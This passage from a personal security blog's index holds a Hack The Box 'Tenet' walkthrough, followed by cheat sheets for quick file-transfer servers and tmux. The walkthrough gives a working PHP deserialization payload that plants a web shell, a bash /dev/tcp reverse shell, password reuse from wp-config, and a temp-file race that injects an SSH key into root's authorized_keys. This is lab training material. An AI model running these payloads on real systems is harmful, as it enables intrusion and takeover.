was primary focused on port 80. In order to find any possible entry point, web files and directories were enumerated using gobuster: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-enum-dirs.txt -f -r ... /icons/ (Status: 403) [Size: 277] /server-status/ (Status: 403) [Size: 277] ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p80-enum-files.txt ... /index.html (Status: 200) [Size: 10918] /.htaccess (Status: 403) [Size: 277] /. (Status: 200) [Size: 10918] /.html (Status: 403) [Size: 277] /.php (Status: 403) [Size: 277] /.htpasswd (Status: 403) [Size: 277] /.htm (Status: 403) [Size: 277] /.htpasswds (Status: 403) [Size: 277] /.htgroup (Status: 403) [Size: 277] /wp-forum.phps (Status: 403) [Size: 277] /.htaccess.bak (Status: 403) [Size: 277] /.htuser (Status: 403) [Size: 277] /.htc (Status: 403) [Size: 277] /.ht (Status: 403) [Size: 277] /users.txt (Status: 200) [Size: 7] ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o scans/p80-common-ext.txt -x txt,php,html ... /.php (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] /.html.txt (Status: 403) [Size: 277] /.html.php (Status: 403) [Size: 277] /.html.html (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 10918] /.htm.txt (Status: 403) [Size: 277] /.htm.php (Status: 403) [Size: 277] /.htm.html (Status: 403) [Size: 277] /.htm (Status: 403) [Size: 277] /users.txt (Status: 200) [Size: 7] /. (Status: 200) [Size: 10918] /wordpress (Status: 301) [Size: 316] [--&gt; http://10.10.10.223/wordpress/] /.htaccess.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.phtml (Status: 403) [Size: 277] /.htc (Status: 403) [Size: 277] /.htc.txt (Status: 403) [Size: 277] /.htc.php (Status: 403) [Size: 277] /.htc.html (Status: 403) [Size: 277] /.html_var_de (Status: 403) [Size: 277] /.html_var_de.txt (Status: 403) [Size: 277] /.html_var_de.php (Status: 403) [Size: 277] /.html_var_de.html (Status: 403) [Size: 277] /server-status (Status: 403) [Size: 277] . Enumeration revealed a /wordpress/ directory: . Because the links of the page were pointing to tenet.htb and were messing up the resulting page, the domain was added to /etc/hosts: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo nano /etc/hosts ... 10.10.10.223 tenet.htb . Because the target was a wordpress site, it was enumerated using wpscan: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/scans] ‚îî‚îÄ$ wpscan --url http://tenet.htb/ -o p80-wordpress.txt ... [+] URL: http://tenet.htb/ [10.10.10.223] [+] Started: Fri May 7 15:30:59 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://tenet.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://tenet.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://tenet.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.6 identified (Outdated, released on 2020-12-08). | Found By: Rss Generator (Passive Detection) | - http://tenet.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6&lt;/generator&gt; | - http://tenet.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6&lt;/generator&gt; [+] WordPress theme in use: twentytwentyone | Location: http://tenet.htb/wp-content/themes/twentytwentyone/ | Last Updated: 2021-03-09T00:00:00.000Z | Readme: http://tenet.htb/wp-content/themes/twentytwentyone/readme.txt | [!] The version is out of date, the latest version is 1.2 | Style URL: http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0 | Style Name: Twenty Twenty-One | Style URI: https://wordpress.org/themes/twentytwentyone/ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi... | Author: the WordPress team | Author URI: https://wordpress.org/ | Found By: Css Style In Homepage (Passive Detection) | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0' . At this point we had good information about the target, however there was still no exploitable vulnerabilities. Further enumeration of the site reveled an interesting comment made by neil talking about a php and a backup file: . We‚Äôre moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn‚Äôt take too long. Thank you for your patience . neil: did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?! . The search on tenet.htb was unsuccessful, but the IP search allowed to access the two files: . Foothold . The backup file contained the source code of sator.php: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/loot] ‚îî‚îÄ$ cat -n sator.php.bak 1 &lt;?php 2 3 class DatabaseExport 4 { 5 public $user_file = 'users.txt'; 6 public $data = ''; 7 8 public function update_db() 9 { 10 echo '[+] Grabbing users from text file &lt;br&gt;'; 11 $this-&gt; data = 'Success'; 12 } 13 14 15 public function __destruct() 16 { 17 file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data); 18 echo '[] Database updated &lt;br&gt;'; 19 // echo 'Gotta get this working properly...'; 20 } 21 } 22 23 $input = $_GET['arepo'] ?? ''; 24 $databaseupdate = unserialize($input); 25 26 $app = new DatabaseExport; 27 $app -&gt; update_db(); 28 29 30 ?&gt; . Looking at the code was possible to detect a PHP deserialization vulnerability caused by the __destruct() magic method, which is called every time there are no other references to a particular object during the shutdown sequence (more info here). By design the function updates the users.txt file on the server using the $app object, however because the unserialize() methods allowed to instantiate a new custom object $databaseupdate, it was possible to exploit the PHP deserialization and abuse the __destruct() to write arbitrary file on disk, leading to remote code execution. The script used to craft the PoC was the following one: . &lt;?php class DatabaseExport { public $user_file = 'test.txt'; public $data = '10099 the test'; } $app = new DataBaseExport; $serialized = serialize($app); echo $serialized; ?&gt; . It was used to serialize a custom object: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ php serializer.php O:14:\"DatabaseExport\":2:{s:9:\"user_file\";s:8:\"test.txt\";s:4:\"data\";s:14:\"10099 the test\";} . The serialized object was passed to the vulnerable function: . test.txt was created, meaning that the PoC worked and the target is vulnerable: . To get remote code execution the script was modified to write a simple web shell on the target: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ cat -n serializer.php 1 &lt;?php 2 3 class DatabaseExport 4 { 5 public $user_file = 'maoutis.php'; 6 public $data = '&lt;?php if(isset($_REQUEST[\"cmd\"])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;'; 7 } 8 9 $app = new DataBaseExport; 10 $serialized = serialize($app); 11 echo $serialized; 12 13 ?&gt; ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ php serializer.php O:14:\"DatabaseExport\":2:{s:9:\"user_file\";s:11:\"maoutis.php\";s:4:\"data\";s:113:\"&lt;?php if(isset($_REQUEST[\"cmd\"])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;\";} . Then the exploit object was passed to the vulnerable function and the web shell was generated: . Finally the reverse shell command was sent to the web shell and a reverse connection was obtained: http://10.10.10.223/maoutis.php?cmd=/bin/bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.24/10099+0&gt;%261 . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.223] 30304 bash: cannot set terminal process group (1642): Inappropriate ioctl for device bash: no job control in this shell www-data@tenet:/var/www/html$ whoami whoami www-data www-data@tenet:/var/www/html$ www-data@tenet:/var/www/html$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@tenet:/var/www/html$ ^Z zsh: suspended nc -nlvp 10099 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ stty raw -echo; fg [1] + continued nc -nlvp 10099 www-data@tenet:/var/www/html$ export TERM=xterm www-data@tenet:/var/www/html$ stty rows 60 columns 235 . Lateral Movement . Enumerated local users: . www-data@tenet:/var$ cat /etc/passwd | grep -v nologin root:x:0:0:root:/root:/bin/bash sync:x:4:65534:sync:/bin:/bin/sync lxd:x:105:65534::/var/lib/lxd/:/bin/false pollinate:x:109:1::/var/cache/pollinate:/bin/false mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false neil:x:1001:1001:neil,,,:/home/neil:/bin/bash . Wordpress configuration file leaked mysql credentials: . www-data@tenet:/var/www/html/wordpress$ cat -s wp-config.php ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'neil' ); /** MySQL database password */ define( 'DB_PASSWORD', 'Opera&lt;redacted&gt;' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); . Because neil reused the same password, it was possible to get user access to the target machine using leaked credentials: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ ssh neil@tenet.htb neil@tenet.htb's password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri May 7 22:39:29 UTC 2021 System load: 0.0 Processes: 185 Usage of /: 15.4% of 22.51GB Users logged in: 0 Memory usage: 12% IP address for ens160: 10.10.10.223 Swap usage: 0% 53 packages can be updated. 31 of these updates are security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Fri May 7 19:57:44 2021 from 10.10.14.13 neil@tenet:~$ id uid=1001(neil) gid=1001(neil) groups=1001(neil) . Privilege Escalation . Enumerated neil sudo privileges: . neil@tenet:~/.local/share/nano$ sudo -l Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh . Enumerated enableSSH.sh: . neil@tenet:~/.local/share/nano$ cat -sn /usr/local/bin/enableSSH.sh 1 #!/bin/bash 2 3 checkAdded() { 4 5 sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3) 6 7 if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then 8 9 /bin/echo \"Successfully added $sshName to authorized_keys file!\" 10 11 else 12 13 /bin/echo \"Error in adding $sshName to authorized_keys file!\" 14 15 fi 16 17 } 18 19 checkFile() { 20 21 if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then 22 23 /bin/echo \"Error in creating key file!\" 24 25 if [[ -f $1 ]]; then /bin/rm $1; fi 26 27 exit 1 28 29 fi 30 31 } 32 33 addKey() { 34 35 tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) 36 37 (umask 110; touch $tmpName) 38 39 /bin/echo $key &gt;&gt;$tmpName 40 41 checkFile $tmpName 42 43 /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys 44 45 /bin/rm $tmpName 46 47 } 48 49 key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\" 50 addKey 51 checkAdded . Looking at the source code it was possible to detect a race condition vulnerability in the addKey() function caused by the insecure temporary save of the future content of root‚Äôs authorized_key. This issue allowed to poison the temp file and inject inside the root‚Äôs authorized_keys a custom value, allowing to get a high privileged access to the machine. PoC of the insecure temp files (word writable file): . neil@tenet:/tmp$ while true; do ls -al /tmp/ssh* 2&gt;/dev/null; done &amp; [1] 17432 neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh -rw-rw-rw- 1 root root 393 May 8 11:52 /tmp/ssh-ZivT3CmF . Created a loop that poisons the temp file with a custom ssh public key: . neil@tenet:/tmp$ while true; do for i in $(ls /tmp/ssh* 2&gt;/dev/null); do echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAtXPtZN+kJ7TjgTIBnQdDQz9S/i417/k+SFrAl8vsUaBpgZrMQ3C6hFUnlLCYx4XTlE3ux/ucakxudjc/0PTjnYJBvUVWqzrrkHyOQ9a4jql3f3VdQjQojYu9QuF7gw2upR10f8vfBK5150AcvlG9Guo/bpiILQBHmVyBz3/0q/CJaiklBoWtfqGUvpCRYMi0A6SlW3ivmPMHqpJOmjw45U+NRCJMt9FwR/MvbpCxafLT2NjNId7sAySYY+zSJsmtKGz5jpLYrgOUUqrT03eRVivn5FcOlRY0SeRZe9q04DPw39PsjnHuzRioz49FnLb/J6HCpEx0BGM3vVhDoMTtWPmRVbKJbZw84RigagcAYnjL9uEhuzjAIqFpH+0HBetQ1ZXGlGQNwAR8FC+bZcnulQWUC5ceYtszHsrjNSwaDBL675thz5TtygxVVov12PyPQCONX5Xep3Ylxj53lNYlVKUbfiMGI3kXxmcsocXubHI7Au+q9FKq8XIoZadangM=' &gt; $i; done; done &amp; [1] 28754 . Ran the script a couple of times in order to be sure to overwrite the key: . neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ ls pspy64 ssh-gEr8Rial ssh-NIjuZPmj systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-apache2.service-jp1S5z systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-systemd-resolved.service-FUiyZO systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-systemd-timesyncd.service-xDGTr1 tmux-1001 vmware-root_982-2965972296 . Logged in using the custom ssh key: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo ssh root@tenet.htb -i /home/pwn/.ssh/id_rsa Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat May 8 12:14:32 UTC 2021 System load: 1.11 Processes: 189 Usage of /: 15.5% of 22.51GB Users logged in: 1 Memory usage: 19% IP address for ens160: 10.10.10.223 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 53 packages can be updated. 31 of these updates are security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Feb 11 14:37:46 2021 root@tenet:~# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig root tenet 04fd5a870b622aa491f031f6fe80f662 ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 10.10.10.223 netmask 255.255.255.0 broadcast 10.10.10.255 inet6 fe80::250:56ff:feb9:c415 prefixlen 64 scopeid 0x20&lt;link&gt; inet6 dead:beef::250:56ff:feb9:c415 prefixlen 64 scopeid 0x0&lt;global&gt; ether 00:50:56:b9:c4:15 txqueuelen 1000 (Ethernet) RX packets 772376 bytes 120290915 (120.2 MB) RX errors 0 dropped 366 overruns 0 frame 0 TX packets 796895 bytes 315607462 (315.6 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 192113 bytes 13793013 (13.7 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 192113 bytes 13793013 (13.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 . Trophy . In a parallel worlds theory, we can't know the relationship between consciousness and multiple realities. Does your head hurt yet ? Try to get some sleep. - Neil . Video . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/",
    "relUrl": "/writeups/HackTheBox/2021-06-12-Tenet/"
  },"35": {
    "doc": "Tenet",
    "title": "Tenet",
    "content": "12 Jun 2021 | Reading time: ~11 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/",
    "relUrl": "/writeups/HackTheBox/2021-06-12-Tenet/"
  },"36": {
    "doc": "TryHackMe",
    "title": "TryHackMe",
    "content": "You‚Äôll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated. Jekyll requires blog post files to be named according to the following format: . YEAR-MONTH-DAY-title.MARKUP . Where YEAR is a four-digit number, MONTH and DAY are both two-digit numbers, and MARKUP is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works. Jekyll also offers powerful support for code snippets: . def print_hi(name) puts \"Hi, #{name}\" end print_hi('Tom') #=&gt; prints 'Hi, Tom' to STDOUT. Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll‚Äôs GitHub repo. If you have questions, you can ask them on Jekyll Talk. ",
    "url": "https://maoutis.github.io/writeups/TryHackMe/",
    "relUrl": "/writeups/TryHackMe/"
  },"37": {
    "doc": "Misc",
    "title": "Multi purpose tools",
    "content": "List of cheatsheet for various multipurpose tools: . | Dynamic Servers | . ",
    "url": "https://maoutis.github.io/cheatsheet/Misc/#multi-purpose-tools",
    "relUrl": "/cheatsheet/Misc/#multi-purpose-tools"
  },"38": {
    "doc": "Misc",
    "title": "Misc",
    "content": " ",
    "url": "https://maoutis.github.io/cheatsheet/Misc/",
    "relUrl": "/cheatsheet/Misc/"
  },"39": {
    "doc": "Dynamic Servers",
    "title": "Misc - Dynamic Servers",
    "content": "#servers #dynamic-servers . | HTTP Server . | Python3 server: | Python2 server: | PHP server: | Ruby server: | Busybox server: | Apache server: | PHP Downloader | . | FTP Server . | pure-ftpd | python3 | TFTP | . | SMB . | Impacket | . | . HTTP Server . Python3 server: . python3¬†-m¬†http.server¬†[port] . Python2 server: . python -m SimpleHTTPServer [port] . PHP server: . php -S 0.0.0.0:8000 . Ruby server: . ruby -run -e httpd . -p 9000 . Busybox server: . busybox httpd -f -p 10000 . Apache server: . service apache2 start cd /var/www/html . PHP Downloader . &lt;?php $uploaddir = '/var/www/uploads/'; $uploadfile = $uploaddir . $_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?&gt; . FTP Server . pure-ftpd . Fast setup: . kali@kali:~$ cat ./setup-ftp.sh #!/bin/bash sudo groupadd ftpgroup sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser sudo pure-pw useradd offsec -u ftpuser -d /ftphome sudo pure-pw mkdb cd /etc/pure-ftpd/auth/ sudo ln -s ../conf/PureDB 60pdb sudo mkdir -p /ftphome sudo chown -R ftpuser:ftpgroup /ftphome/ sudo systemctl restart pure-ftpd . Files contained within /ftphome will be available once connected . python3 . python3 -m pyftpdlib -p 21 [I 2020-07-14 22:54:10] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=7302 &lt;&lt;&lt; [I 2020-07-14 22:54:10] concurrency model: async [I 2020-07-14 22:54:10] masquerade (NAT) address: None [I 2020-07-14 22:54:10] passive ports: None . -w: write access -u: specifies username to use -P: specifies password to use . TFTP . kali@kali:~$ sudo chown nobody: /tftp kali@kali:~$ sudo atftpd --daemon --port 69 /tftp . SMB . Impacket . smbserver.py (ref) from the impacket project can be used to launch a nice, simple SMB server on port 445. # Non authenticated share kali@kali:~$ python smbserver.py transfer_share /root/shells/ # authenticated share kali@kali:~$ sudo impacket-smbserver kali . -smb2support -username maoutis -password Qwerty . C:\\&gt;copy \\\\192.168.119.209\\transf_share\\shell.exe . copy \\\\192.168.119.209\\transf_share\\shell.exe . 1 file(s) copied. &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/cheatsheet/Misc/Dynamic%20Servers/",
    "relUrl": "/cheatsheet/Misc/Dynamic%20Servers/"
  },"40": {
    "doc": "Dynamic Servers",
    "title": "Dynamic Servers",
    "content": "29 May 2021 . ",
    "url": "https://maoutis.github.io/cheatsheet/Misc/Dynamic%20Servers/",
    "relUrl": "/cheatsheet/Misc/Dynamic%20Servers/"
  },"41": {
    "doc": "Terms & Editors",
    "title": "Terminals &amp; Text Editors",
    "content": "List of cheatsheet for various terminals and text editors: . | Tmux | . ",
    "url": "https://maoutis.github.io/cheatsheet/Terms%20&%20Editors/#terminals--text-editors",
    "relUrl": "/cheatsheet/Terms%20&%20Editors/#terminals--text-editors"
  },"42": {
    "doc": "Terms & Editors",
    "title": "Terms & Editors",
    "content": " ",
    "url": "https://maoutis.github.io/cheatsheet/Terms%20&%20Editors/",
    "relUrl": "/cheatsheet/Terms%20&%20Editors/"
  },"43": {
    "doc": "Tmux",
    "title": "Terms &amp; Editors - Tmux",
    "content": "#tmux #terminal . . | Description | Cheatsheet . | Tmux parameters | Traditional Mode | Sessions shortcuts | Windows shortcuts | Panes shortcuts | Navigation Mode shortcuts | Misc shortcuts | . | Custom Configuration | . Description . Tmux‚Äôs authors describe it as a terminal multiplexer. Behind this fancy term hides a simple concept: . Within one terminal window you can open multiple windows and split-views (called ‚Äúpanes‚Äù in tmux lingo). Each pane will contain its own, independently running terminal instance. This allows you to have multiple terminal commands and applications running visually next to each other without the need to open multiple terminal emulator windows. Cheatsheet . Tmux parameters . | Command | Description | . | tmux ls | List all running sessions | . | tmux attach -t &lt;number&gt; | Attach the &lt;number&gt; session | . | tmux a #&lt;name&gt; | Attach the &lt;name&gt; session | . | tmux kill-session #&lt;name&gt; | Kill the &lt;name&gt; session | . | tmux new -s &lt;name&gt; | Give a name to the new created session | . | tmux rename-session -t &lt;number&gt; &lt;new_name&gt; | Rename the session &lt;number&gt; to &lt;new_name&gt; | . Traditional Mode . prefix key + command key (es. C-b + z) . By default, tmux uses C-b as prefix key. (C- means ‚Äúpress and hold the Ctrl key‚Äù). My custom PrefKey is C-f . Sessions shortcuts . | Shortcut | Description | . | PrefKey + :new | New session | . | PrefKey + s | List all sessions | . | PrefKey + $ | Rename current session | . | PrefKey + d | Detach current session | . Windows shortcuts . | Shortcut | Description | . | PrefKey + c | Create new window | . | PrefKey + w | List all windows | . | PrefKey + p (ALT+PagDown) | Switch to the previous window | . | PrefKey + n (ALT+PagUp) | Switch to the next window | . | PrefKey + &lt;number&gt; | Switch to &lt;number&gt; window | . | PrefKey + f | Find window | . | PrefKey + , | Rename the current windows | . | PrefKey + &amp; | Kill the current windows | . | PrefKey + :swap-window -t -1 | Swap window with the previous one | . | PrefKey + :swap-window -s &lt;X&gt; -t &lt;Y&gt; | Swap window number &lt;X&gt; with the window number &lt;Y&gt; | . Panes shortcuts . | Shortcut | Description | . | PrefKey + % ( | ) | Split vertically | . | PrefKey + \" ( - ) | Split orizzontally | . | PrefKey + &lt;Arrow&gt; (ALT+&lt;arrow&gt;) | Switch pane | . | PrefKey + Ctrl + o | Swap panes | . | PrefKey + q | Show pane number | . | PrefKey + x | Kill current pane | . | PrefKey + z | Make a pane go full-screen / shrink it back to its previous size | . | PrefKey + space | Swap window‚Äôs panes layout | . | PrefKey + } | Move the current pane left | . | PrefKey + { | Move the current pane left | . | PrefKey + Ctrl + &lt;arrow&gt; | Resize pane in &lt;arrow&gt; direction | . | PrefKey + Alt + &lt;arrow&gt; | Resize pane in &lt;arrow&gt; direction (more space) | . | PrefKey + ! | Break current pane in a separate window | . Navigation Mode shortcuts . | Shortcut | Description | . | PrefKey + [ | Enable navigation mode | . | ? | Search up | . | / | Search down | . | n | Search again | . | ^ | Back to indentation | . | Space | Start selection | . | Esc | Clear selection | . | Enter | Copy selection | . | p | Paste buffer | . | j (&lt;arrow down&gt;) | Cursor down | . | h (&lt;arrow left&gt;) | Cursor left | . | l (&lt;arrow right&gt;) | Cursor right | . | k (&lt;arrow up&gt;) | Cursor up | . | H | Cursor to top line | . | M | Cursor to middle line | . | L | Cursor to bottom line | . | $ | End of line | . | 0 | Start of line | . | : | Go to line | . | Ctrl + d | Half page down | . | Ctrl + u | Half page up | . | Ctrl + f | Next page | . | Ctrl + b | Previous page | . | w | Next word | . | b | Previous word | . | q | Quit mode | . | Ctrl + &lt;arrow down&gt; (J) | Scroll down | . | Ctrl + &lt;arrow up&gt; (K) | Scroll up | . | d | Delete entire line | . | D | Delete to end of line | . Misc shortcuts . | Shortcut | Description | . | PrefKey + ? | List all commands | . | PrefKey + t | Big clock | . | PrefKey + : | Prompt for commands | . Custom Configuration . This is my current configuration. It was created to: . | declare more convenient and easily memorized shortcuts | implement custom functionality to more conveniently handle clipboard and buffer saving | show current IPs in the bottom bar so you don‚Äôt have to search for them every time | implement the use of the mouse | . # === Unbind keys === #unbind system defined prefix unbind C-b # === Bind keys to prefix table === # vertical split bind -N \"Vertical split\" | split-window -h -c '#{pane_current_path}' # horizontal split bind -N \"Horizzontal split\" - split-window -v -c '#{pane_current_path}' # source .tmux.conf file bind -N \"Reload tmux.conf file\" r source-file /etc/tmux.conf \\; display \"Configuration Reloaded!\" # Change prefix bind C-f send-prefix # Send tmux buffer to system clipboards bind -N \"Copy tmux clipboard to system primary\" P run \"tmux show-buffer | xclip -sel p -i &gt;/dev/null\"\\; display \"Tmux clipboard sent to system clipboard!\" bind -N \"Copy tmux clipboard to system clipboard\" C run \"tmux show-buffer | xclip -sel c -i &gt;/dev/null\"\\; display \"Tmux clipboard sent to system primary!\" bind -N \"Copy tmux clipboard to all clipboard\" a run \"tmux show-buffer | xclip -sel p -i -f | xclip -sel c -i &gt;/dev/null\"\\; display \"Tmux clipboard sent to all clipboards!\" # Paste tmux clipboard using Ctrl-F + p bind -N \"Paste the most recent tmux buffer\" p paste-buffer # === Bind keys to root table === # switch panes using Alt-arrow without prefix bind -n M-Left select-pane -L bind -n M-Right select-pane -R bind -n M-Up select-pane -U bind -n M-Down select-pane -D # switch windows using Alt+Pag without prefix bind -n M-PPage previous-window bind -n M-NPage next-window # === Set options === # Vi mode for Copy mode setw -g mode-keys vi # Send tmux clipboard to system clipboard when pressing y in copy-mode bind -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel 'xclip -in -selection clipboard' # set prefix to control-f set -g prefix C-f # helps in faster key repetition set -sg escape-time 0 # don't allow tmux to rename the window based on commands running set-window-option -g allow-rename off # Enable mouse and copy from mouse selection set -g mouse on # For tmux version 2.1 and up # show host name and IP 